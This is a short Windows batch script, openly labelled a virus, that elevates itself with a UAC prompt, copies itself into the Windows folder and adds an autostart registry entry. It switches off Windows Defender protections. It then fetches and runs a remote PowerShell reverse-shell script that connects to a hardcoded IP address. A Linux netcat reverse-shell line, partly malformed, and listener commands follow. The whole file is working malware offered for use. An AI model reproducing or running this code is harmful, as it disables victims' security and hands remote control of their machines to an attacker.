move "%~f0" "%windir%"
set "newFolder=%windir%"

::sudo/rootkit (v1)
net session >nul 2>&1
if %errorlevel% neq 0 (
    PowerShell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs" & exit
)

if "%~dp0" neq "%newFolder%\" (
    move "%~f0" "%newFolder%"
)

::autostart
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "virus" /t REG_SZ /F /D "%newFolder%\virus.bat"

::Disabling Defender
PowerShell -Command "Set-MpPreference -MAPSReporting 0"
PowerShell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -ExecutionPolicy Bypass -Command "New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"

::backdoor

::tgt=win
powershell -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.190.242.161 87"

::tgt=lin
sudo nc -e /bin/bash/ your_machine_IP

::server: nc -lvnp 87
::server(tgt=win): stty raw -echo; (stty size; cat) | sudo nc -lvnp 87
